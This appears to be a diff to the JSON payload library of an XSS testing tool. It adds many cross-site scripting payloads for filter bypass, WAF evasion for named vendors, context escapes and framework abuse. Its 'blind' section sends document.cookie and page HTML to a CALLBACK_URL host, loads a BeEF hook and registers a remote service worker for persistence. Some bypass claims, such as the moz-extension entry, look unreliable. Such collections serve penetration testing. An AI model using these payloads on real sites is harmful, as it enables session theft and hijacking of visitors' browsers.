@@ -84,6 +84,38 @@
           "severity": "high",
           "tags": ["basic", "iframe"],
           "payload": "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>"
+        },
+        {
+          "name": "Details/Summary",
+          "description": "HTML5 details element with ontoggle event",
+          "contexts": ["html"],
+          "severity": "high",
+          "tags": ["basic", "html5"],
+          "payload": "<details ontoggle=alert(1)><summary>Click me</summary></details>"
+        },
+        {
+          "name": "Video OnError",
+          "description": "Video element with onerror handler",
+          "contexts": ["html"],
+          "severity": "high",
+          "tags": ["basic", "video"],
+          "payload": "<video><source onerror=alert(1)></video>"
+        },
+        {
+          "name": "Marquee OnStart",
+          "description": "Marquee element with onstart event",
+          "contexts": ["html"],
+          "severity": "medium",
+          "tags": ["basic", "marquee"],
+          "payload": "<marquee onstart=alert(1)>XSS</marquee>"
+        },
+        {
+          "name": "Form OnSubmit",
+          "description": "Form with onsubmit event handler",
+          "contexts": ["html"],
+          "severity": "high",
+          "tags": ["basic", "form"],
+          "payload": "<form onsubmit=alert(1)><input type=submit></form>"
         }
       ]
     },
@@ -138,6 +170,54 @@
           "severity": "high",
           "tags": ["bypass", "es6"],
           "payload": "`${alert(1)}`"
+        },
+        {
+          "name": "WAF Bypass - Nested Events",
+          "description": "Nested event handlers to bypass WAF detection",
+          "contexts": ["html"],
+          "severity": "high",
+          "tags": ["bypass", "waf", "nested"],
+          "payload": "<svg><animatetransform onbegin=alert(1)>"
+        },
+        {
+          "name": "DOM Clobbering",
+          "description": "Use DOM clobbering to bypass filters",
+          "contexts": ["html"],
+          "severity": "medium",
+          "tags": ["bypass", "clobbering"],
+          "payload": "<form id=x tabindex=1 onfocus=alert(1)></form>"
+        },
+        {
+          "name": "Fragment Identifier",
+          "description": "Use fragment identifier for bypass",
+          "contexts": ["script"],
+          "severity": "medium",
+          "tags": ["bypass", "fragment"],
+          "payload": "location='javascript:alert(1)'"
+        },
+        {
+          "name": "Protocol Bypass",
+          "description": "Alternative protocols to bypass restrictions",
+          "contexts": ["url"],
+          "severity": "high",
+          "tags": ["bypass", "protocol"],
+          "payload": "data:text/html,<script>alert(1)</script>"
+        },
+        {
+          "name": "Comment Bypass",
+          "description": "HTML comments to split filtered keywords",
+          "contexts": ["html"],
+          "severity": "medium",
+          "tags": ["bypass", "comment"],
+          "payload": "<img src=x one<!---->rror=alert(1)>"
+        },
+        {
+          "name": "Tab/Newline Bypass",
+          "description": "Use tabs and newlines to bypass keyword filters",
+          "contexts": ["html"],
+          "severity": "medium",
+          "tags": ["bypass", "whitespace"],
+          "payload": "<img\tsrc=x\non\nerror=alert(1)>"
         }
       ]
     },
@@ -184,6 +264,46 @@
           "severity": "medium",
           "tags": ["context", "comment"],
           "payload": "--><script>alert(1)</script><!--"
+        },
+        {
+          "name": "JSON Context Escape",
+          "description": "Escape from JSON context in script tag",
+          "contexts": ["script"],
+          "severity": "high",
+          "tags": ["context", "json"],
+          "payload": "</script><script>alert(1)</script><script>"
+        },
+        {
+          "name": "CSS Import",
+          "description": "CSS import with javascript protocol",
+          "contexts": ["css"],
+          "severity": "medium",
+          "tags": ["context", "css", "import"],
+          "payload": "@import'javascript:alert(1)'"
+        },
+        {
+          "name": "Event Handler in Attribute",
+          "description": "Event handler when injected in any attribute",
+          "contexts": ["attribute"],
+          "severity": "high",
+          "tags": ["context", "event"],
+          "payload": "x\" autofocus onfocus=\"alert(1)"
+        },
+        {
+          "name": "CDATA Break-out",
+          "description": "Break out of CDATA section in XML/XHTML",
+          "contexts": ["comment"],
+          "severity": "medium",
+          "tags": ["context", "cdata"],
+          "payload": "]]><script>alert(1)</script><![CDATA["
+        },
+        {
+          "name": "Meta Refresh XSS",
+          "description": "Meta refresh with javascript protocol",
+          "contexts": ["html"],
+          "severity": "high",
+          "tags": ["context", "meta"],
+          "payload": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">"
         }
       ]
     },
@@ -230,6 +350,38 @@
           "severity": "medium",
           "tags": ["advanced", "chain"],
           "payload": "<div onmouseover=\"this.onclick=function(){alert(1)}\" onclick=\"\">Hover then click</div>"
+        },
+        {
+          "name": "Polyglot XSS",
+          "description": "Universal XSS payload that works in multiple contexts",
+          "contexts": ["html", "attribute", "script"],
+          "severity": "high",
+          "tags": ["advanced", "polyglot"],
+          "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
+        },
+        {
+          "name": "RegExp Constructor",
+          "description": "Use RegExp constructor with source property",
+          "contexts": ["script"],
+          "severity": "high",
+          "tags": ["advanced", "regexp"],
+          "payload": "RegExp.prototype.toString=function(){return'alert(1)'};//.toString()"
+        },
+        {
+          "name": "Error Handler Abuse",
+          "description": "Trigger error handlers to execute code",
+          "contexts": ["script"],
+          "severity": "high",
+          "tags": ["advanced", "error"],
+          "payload": "window.onerror=alert;throw 1"
+        },
+        {
+          "name": "Mutation Observer",
+          "description": "Use MutationObserver to trigger payload",
+          "contexts": ["script"],
+          "severity": "high",
+          "tags": ["advanced", "mutation"],
+          "payload": "new MutationObserver(alert).observe(document,{childList:1});document.body.appendChild(document.createElement('div'))"
         }
       ]
     },
@@ -243,7 +395,7 @@
           "contexts": ["html", "script"],
           "severity": "high",
           "tags": ["blind", "exfiltration"],
-          "payload": "<script>new Image().src='http://{{callback}}/xss?'+document.cookie</script>",
+          "payload": "<script>new Image().src='http://CALLBACK_URL/xss?'+document.cookie</script>",
           "requires_callback": true
         },
         {
@@ -252,7 +404,7 @@
           "contexts": ["script"],
           "severity": "high",
           "tags": ["blind", "fetch"],
-          "payload": "fetch('http://{{callback}}/xss', {method:'POST', body: document.documentElement.outerHTML})",
+          "payload": "fetch('http://CALLBACK_URL/xss', {method:'POST', body: document.documentElement.outerHTML})",
           "requires_callback": true
         },
         {
@@ -261,7 +413,7 @@
           "contexts": ["script"],
           "severity": "high",
           "tags": ["blind", "websocket"],
-          "payload": "var ws=new WebSocket('ws://{{callback}}/ws');ws.onopen=function(){ws.send(document.cookie)}",
+          "payload": "var ws=new WebSocket('ws://CALLBACK_URL/ws');ws.onopen=function(){ws.send(document.cookie)}",
           "requires_callback": true
         },
         {
@@ -270,8 +422,173 @@
           "contexts": ["script"],
           "severity": "medium",
           "tags": ["blind", "dns"],
-          "payload": "fetch('http://'+btoa(document.cookie)+'.{{callback}}')",
+          "payload": "fetch('http://'+btoa(document.cookie)+'.CALLBACK_URL')",
           "requires_callback": true
+        },
+        {
+          "name": "BeEF Hook",
+          "description": "Load BeEF (Browser Exploitation Framework) hook",
+          "contexts": ["html", "script"],
+          "severity": "high",
+          "tags": ["blind", "beef"],
+          "payload": "<script src=\"http://CALLBACK_URL:3000/hook.js\"></script>",
+          "requires_callback": true
+        },
+        {
+          "name": "CSP Bypass Report",
+          "description": "Trigger CSP violation report to exfiltrate data",
+          "contexts": ["script"],
+          "severity": "medium",
+          "tags": ["blind", "csp"],
+          "payload": "fetch('http://CALLBACK_URL/report',{method:'POST',body:JSON.stringify({url:location.href,cookies:document.cookie})})",
+          "requires_callback": true
+        },
+        {
+          "name": "Service Worker Registration",
+          "description": "Register malicious service worker for persistence",
+          "contexts": ["script"],
+          "severity": "high",
+          "tags": ["blind", "serviceworker"],
+          "payload": "navigator.serviceWorker.register('http://CALLBACK_URL/sw.js').then(()=>fetch('http://CALLBACK_URL/registered'))",
+          "requires_callback": true
+        }
+      ]
+    },
+    "waf_bypass": {
+      "name": "WAF & Filter Bypass",
+      "description": "Advanced techniques to bypass Web Application Firewalls and security filters",
+      "payloads": [
+        {
+          "name": "Cloudflare Bypass",
+          "description": "Specific technique to bypass Cloudflare WAF",
+          "contexts": ["html"],
+          "severity": "high",
+          "tags": ["waf", "cloudflare"],
+          "payload": "<svg/onload=alert(1)//>"
+        },
+        {
+          "name": "ModSecurity Bypass",
+          "description": "Bypass ModSecurity CRS rules",
+          "contexts": ["html"],
+          "severity": "high",
+          "tags": ["waf", "modsecurity"],
+          "payload": "<img src=1 onerror=alert(1)>"
+        },
+        {
+          "name": "AWS WAF Bypass",
+          "description": "Technique to bypass AWS WAF",
+          "contexts": ["script"],
+          "severity": "high",
+          "tags": ["waf", "aws"],
+          "payload": "eval(String.fromCharCode(97,108,101,114,116,40,49,41))"
+        },
+        {
+          "name": "Akamai Bypass",
+          "description": "Bypass Akamai Kona Site Defender",
+          "contexts": ["html"],
+          "severity": "high",
+          "tags": ["waf", "akamai"],
+          "payload": "<iframe srcdoc='&lt;script&gt;parent.alert(1)&lt;/script&gt;'>"
+        },
+        {
+          "name": "Imperva Bypass",
+          "description": "Bypass Imperva SecureSphere WAF",
+          "contexts": ["html"],
+          "severity": "high",
+          "tags": ["waf", "imperva"],
+          "payload": "<svg><script>alert&#40;1&#41;</script>"
+        }
+      ]
+    },
+    "browser_specific": {
+      "name": "Browser-Specific Payloads",
+      "description": "Payloads that target specific browser vulnerabilities or features",
+      "payloads": [
+        {
+          "name": "Chrome Extension Bypass",
+          "description": "Bypass Chrome extension content security",
+          "contexts": ["script"],
+          "severity": "medium",
+          "tags": ["browser", "chrome"],
+          "payload": "chrome.runtime.sendMessage('', {}, alert)"
+        },
+        {
+          "name": "Firefox moz-extension",
+          "description": "Firefox extension protocol abuse",
+          "contexts": ["url"],
+          "severity": "medium",
+          "tags": ["browser", "firefox"],
+          "payload": "moz-extension://alert(1)"
+        },
+        {
+          "name": "Safari WebKit Bypass",
+          "description": "WebKit specific payload for Safari",
+          "contexts": ["script"],
+          "severity": "medium",
+          "tags": ["browser", "safari"],
+          "payload": "Object.defineProperty(window,'alert',{get:function(){return alert}}); alert(1)"
+        },
+        {
+          "name": "Internet Explorer VBScript",
+          "description": "VBScript execution in Internet Explorer",
+          "contexts": ["html"],
+          "severity": "high",
+          "tags": ["browser", "ie", "vbscript"],
+          "payload": "<script language=\"vbscript\">alert(1)</script>"
+        },
+        {
+          "name": "Edge Legacy Bypass",
+          "description": "Legacy Edge specific vulnerability",
+          "contexts": ["script"],
+          "severity": "low",
+          "tags": ["browser", "edge"],
+          "payload": "window.external.AddFavorite('javascript:alert(1)','XSS')"
+        }
+      ]
+    },
+    "framework_bypass": {
+      "name": "Framework-Specific Bypasses",
+      "description": "Payloads designed to bypass popular JavaScript framework protections",
+      "payloads": [
+        {
+          "name": "React dangerouslySetInnerHTML",
+          "description": "Bypass React's XSS protection via dangerouslySetInnerHTML",
+          "contexts": ["script"],
+          "severity": "high",
+          "tags": ["framework", "react"],
+          "payload": "React.createElement('div',{dangerouslySetInnerHTML:{__html:'<img src=x onerror=alert(1)>'}})"
+        },
+        {
+          "name": "Angular $sce.trustAsHtml",
+          "description": "Bypass Angular's Strict Contextual Escaping",
+          "contexts": ["script"],
+          "severity": "high",
+          "tags": ["framework", "angular"],
+          "payload": "$sce.trustAsHtml('<script>alert(1)</script>')"
+        },
+        {
+          "name": "Vue v-html Directive",
+          "description": "Abuse Vue.js v-html directive for XSS",
+          "contexts": ["html"],
+          "severity": "high",
+          "tags": ["framework", "vue"],
+          "payload": "<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>"
+        },
+        {
+          "name": "jQuery .html() Method",
+          "description": "Bypass jQuery's basic escaping with .html()",
+          "contexts": ["script"],
+          "severity": "high",
+          "tags": ["framework", "jquery"],
+          "payload": "$('<div>').html('<img src=x onerror=alert(1)>').appendTo('body')"
+        },
+        {
+          "name": "Ember.js SafeString",
+          "description": "Abuse Ember.js SafeString for XSS execution",
+          "contexts": ["script"],
+          "severity": "medium",
+          "tags": ["framework", "ember"],
+          "payload": "Ember.String.htmlSafe('<script>alert(1)</script>')"
         }
       ]
     }
